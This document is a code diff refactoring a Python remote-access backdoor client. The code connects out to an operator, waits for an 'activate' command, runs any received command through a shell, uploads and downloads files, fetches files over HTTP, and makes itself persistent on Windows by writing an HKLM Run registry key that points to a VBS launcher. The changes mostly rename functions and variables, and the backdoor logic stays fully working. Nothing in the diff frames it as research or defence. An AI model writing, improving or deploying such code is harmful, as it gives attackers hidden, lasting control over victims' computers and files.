@@ -42,7 +42,6 @@ def Downhttp(sock, url):
 
   return "Download finished 🍺"
 
-# persistence
 def Persist(sock, redown=None, newdir=None):
   if os.name == 'nt':
       # fetch executable's location
@@ -67,13 +66,16 @@ def Persist(sock, redown=None, newdir=None):
       vbs.close()
 
       # add registry to startup
-      persist = Exec('reg ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v blah /t REG_SZ /d "' + vbsdir + '"')
+      persist = run('reg ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v blah /t REG_SZ /d "' + vbsdir + '"')
       persist += '\nPersistence complete.\n'
       return persist
 
-def Exec(cmde):
-  execproc = sp.Popen(cmde, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
-  o = execproc.stdout.read() + execproc.stderr.read()
+def run(s):
+  c = sp.Popen(s, shell=True, 
+               stdout=sp.PIPE, 
+               stderr=sp.PIPE)
+  o = c.stdout.read() 
+  o += c.stderr.read()
   return o
 
 while True:
@@ -83,7 +85,6 @@ while True:
 
     cipher = get_cipher()
 
-    # waiting to be activated...
     data = Receive(s)
 
     if data == 'activate':
@@ -101,30 +102,32 @@ while True:
       elif data.startswith('cd '):
         try:
           os.chdir(data[3:])
-          stdoutput = ""
         except:
-          stdoutput = "Error changing directory.\n"
+          ret = 'Error changing directory.\n'
 
       elif data.startswith('download '):
-        stdoutput = Upload(sock, data[9:])
+        ret = Upload(sock, data[9:])
 
       elif data.startswith('downhttp '):
-        stdoutput = Downhttp(sock, data[9:])
+        ret = Downhttp(sock, data[9:])
 
       elif data.startswith('upload '):
-        stdoutput = Download(sock, data[7:])
+        ret = Download(sock, data[7:])
 
-      elif data.startswith("persist"):
+      elif data.startswith('persist '):
         # Attempt persistence
-        if len(data.split(' ')) == 1: stdoutput = Persist(s)
-        elif len(data.split(' ')) == 2: stdoutput = Persist(s, data.split(' ')[1])
-        elif len(data.split(' ')) == 3: stdoutput = Persist(s, data.split(' ')[1], data.split(' ')[2])
+        if len(data.split(' ')) == 1: 
+          ret = Persist(s)
+        elif len(data.split(' ')) == 2:
+          ret = Persist(s, data.split(' ')[1])
+        elif len(data.split(' ')) == 3:
+          ret = Persist(s, data.split(' ')[1], data.split(' ')[2])
 
       else:
-        stdoutput = Exec(data)
+        ret = run(data)
 
-      stdoutput = stdoutput + '\n' + os.getcwd() + '>'
-      Send(sock, stdoutput)
+      ret = ret + '\n' + os.getcwd() + '>'
+      Send(sock, ret)
   except socket.error:
     sock.close()
     time.sleep(10)
